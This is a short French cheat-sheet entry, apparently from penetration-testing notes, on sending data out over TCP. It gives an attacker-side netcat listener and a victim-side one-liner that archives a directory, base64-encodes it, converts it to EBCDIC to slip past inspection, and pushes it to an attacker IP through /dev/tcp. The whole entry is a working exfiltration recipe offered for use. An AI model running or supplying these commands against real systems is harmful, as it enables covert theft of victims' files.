## Envoyer des données via tcp

Attaquant
```
nc -lvp 8080 > /tmp/my-file.data
```
<br>

Vitcime
```
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/<IP>/8080
```
